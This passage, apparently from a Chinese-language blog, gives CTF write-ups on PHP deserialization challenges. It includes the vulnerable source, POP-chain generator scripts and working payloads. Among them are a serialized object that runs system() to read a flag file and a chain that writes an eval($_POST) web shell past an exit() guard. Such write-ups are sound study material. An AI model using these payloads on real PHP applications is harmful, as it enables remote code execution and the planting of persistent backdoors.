class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>有一个很明显的<code>__destruct</code>函数，可以执行函数并且没有任何过滤，不过没有触发反序列化的点。</p>
<p>但是还是可以利用<code>gettime</code>函数中的<code>call_user_func</code>函数传入<code>unserialize</code>函数，生成字符串：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> Test;</span><br><span class="line">$ut = serialize($t);</span><br><span class="line"><span class="keyword">echo</span> $ut;</span><br></pre></td></tr></table></figure>
<p>传入参数<code>unserialize</code>和<code>O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code>。</p>
<h2 id="网鼎杯-2020-青龙组-AreUSerialz">[网鼎杯 2020 青龙组]AreUSerialz</h2>
<h3 id="TODO">TODO</h3>
<h2 id="安洵杯-2019-easy-serialize-php">[安洵杯 2019] easy_serialize_php</h2>
<h3 id="考点-v3">考点</h3>
<ul>
<li>代码审计</li>
<li>PHP 反序列化对象逃逸</li>
</ul>
<h3 id="解题-v3">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据提示查看phpinfo</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703230203.png" alt=""></p>
<p>直接访问d0g3_f1ag.php没有回显。</p>
<h3 id="TODO-v2">TODO</h3>
<h2 id="ZJCTF2019-NiZhuanSiWei">[ZJCTF2019]NiZhuanSiWei</h2>
<h3 id="考点-v4">考点</h3>
<ul>
<li>代码审计</li>
<li>文件包含</li>
<li>PHP反序列化</li>
</ul>
<h3 id="解题-v4">解题</h3>
<p>直接给出源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="file-get-contents绕过">file_get_contents绕过</h4>
<p>有两种方式绕过：</p>
<ol>
<li>使用php://input伪协议绕过<br>
① 将要GET的参数?xxx=php://input<br>
② 用post方法传入想要file_get_contents()函数返回的值</li>
<li>用data://伪协议绕过<br>
将url改为：?xxx=data://text/plain;base64，想要file_get_contents()函数返回的值的base64编码<br>
或者将url改为：?xxx=data:text/plain,(url编码的内容)</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>
<h4 id="读取useless-php">读取useless.php</h4>
<p>题目有第二个参数file，大概是include()这个file，题目提示我们要包含useless.php，同时有一个判断是file参数不能传入flag，也就是我们不能直接包含flag.php。</p>
<p>利用php://filter协议读取这个useless.php，构造payload读取useless.php：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>
<p>useless.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;HAHAHAHAHA&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="反序列化">反序列化</h4>
<p>useless.php的魔术方法是<code>__toString()</code>，刚好可以使用<code>echo $password</code>触发这个魔术方法。</p>
<p>生成payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> Flag();</span><br><span class="line">$s = serialize($o);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>综合起来的payload就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="MRCTF2020-Ezpop">[MRCTF2020]Ezpop</h2>
<h3 id="考点-v5">考点</h3>
<ul>
<li>POP链构造</li>
</ul>
<h3 id="解题-v5">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $var=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$m = <span class="keyword">new</span> Modifier();</span><br><span class="line">$t-&gt;p = $m;</span><br><span class="line">$s-&gt;source = $s;</span><br><span class="line">$s-&gt;str = $t;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($s));</span><br></pre></td></tr></table></figure>
<h2 id="EIS-2019-EzPOP">[EIS 2019]EzPOP</h2>
<h3 id="考点-v6">考点</h3>
<ul>
<li>POP链构造</li>
<li>php://filter 绕过exit()</li>
<li>base64编码规则</li>
</ul>
<h3 id="解题-v6">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store, $key = <span class="string">&#x27;flysystem&#x27;</span>, $expire = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params">$expire</span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> $name</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params">$data</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">$name, $value, $expire = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>题目提示的很明显，需要构造一个POP链，能利用的魔法函数只有 <code>A::__destruct()</code>，可能可以利用的敏感函数：B 类 <code>set()</code> 中的 <code>file_put_contents()</code>。先分析一下 <code>file_put_contents()</code> 函数是否满足利用条件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">$result = file_put_contents($filename, $data);</span><br></pre></td></tr></table></figure>
<p>在 exit() 代码后面拼接 <code>$data</code> 数据，然后写入文件。这样就会导致我们通过<code>$data</code>写入的shll都不会被执行。</p>
<p>exit()函数可以利用<code>base64_decode</code>以及<code>php://filter</code>可以绕过。</p>
<blockquote>
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815093758.png" alt=""></p>
<p>这里思路是<strong>利用 <code>php://filter</code> 提供的各种函数去除 “死亡exit”</strong>。</p>
<p>接下来开始寻找 POP 链</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815093927.png" alt=""></p>
<p>接下来回溯看<code>$filename</code>和``$data`是怎么来的：</p>
<p><code>$filename</code>：先调用<code>getCacheKey($name)</code>，改方法是执行连接字符串的作用：<code>$this-&gt;option['prefix'].$name</code>构成filename。</p>
<p><code>$data</code>：来自于<code> $this-&gt;serialize($value)</code>，所以再关注<code>$value</code>是怎么来的。<code>$value</code>是<code>A::getForStorage()</code>的返回值：<code>json_encode([A::cleanContents(A::cache), A::complete]);</code>。<br>
<code>A::cleanContents(A::cache)</code>实现了一个过滤的功能，<strong>A::complete更容易控制，直接写为shellcode</strong>。</p>
<p>其中cleanContents():</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">    $cachedProperties = array_flip([</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">            $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $contents;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>尝试本地运行：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">    $cachedProperties = array_flip([</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">            $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $contents;</span><br><span class="line">&#125;</span><br><span class="line">$cache=<span class="keyword">array</span>();</span><br><span class="line">$complete=<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> json_encode([cleanContents($cache), $complete]);</span><br></pre></td></tr></table></figure>
<p>得到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[],&quot;&lt;?php @eval($_POST[\&quot;a\&quot;]);?&gt;&quot;]</span><br></pre></td></tr></table></figure>
<p>可以看到直接complete写入shell会使shell中双引号被转义了，所以得考虑用base64编码绕过转义，再在之后解码。由于之后可以让<code>$this-&gt;options['serialize']=base64.decode</code>，这样和filter://就共有两处解码处理，所以对应这里考虑编码两次。</p>
<p>最终代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store,$key,$expire</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key=$key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire=$expire;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store=$store;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $option;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;serialize&#x27;</span>]=<span class="string">&#x27;base64_decode&#x27;</span>;</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>]=<span class="literal">false</span>;</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]=<span class="string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> A($b,<span class="string">&#x27;eval.php&#x27;</span>,<span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave=<span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache=<span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete=base64_encode(<span class="string">&#x27;abc&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]); ?&gt;&#x27;</span>));</span><br><span class="line"><span class="comment">//必须添加三个字符使得shell之前的字符串进行base64解码时不影响到shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>这里还要了解base64解码特点，base64解码的合法字符只包括<code>[a-zA-Z1-9]+/</code>这64个字符。</p>
<ul>
<li>编码时：把<strong>明文每8位按6位查表转码</strong>，不足的位数用<code>=</code>补0</li>
<li>解码时：忽略<code>[&quot;,:</code>等64个字符之外的字符，然后逆运算就行</li>
</ul>
<p>所以要求编码为4的倍数，由于shell前面的字符串中存在的base64编码有效字符只有<code>php//000000000000exit</code>21个字符，因此应该在shell前补上3个有效字符。</p>
<h2 id="2020-新春红包题">[2020 新春红包题]</h2>
<p>和上一题类似，在文件名那里做了两个处理，一是文件名包含随机字符，第二点是限制了<code>.php</code>后缀。</p>
<h3 id="解法1">解法1</h3>
<p>直接写命令，生成flag文件。</p>
<p>参见安全客文章:<a href="https://www.anquanke.com/post/id/194036">https://www.anquanke.com/post/id/194036</a></p>
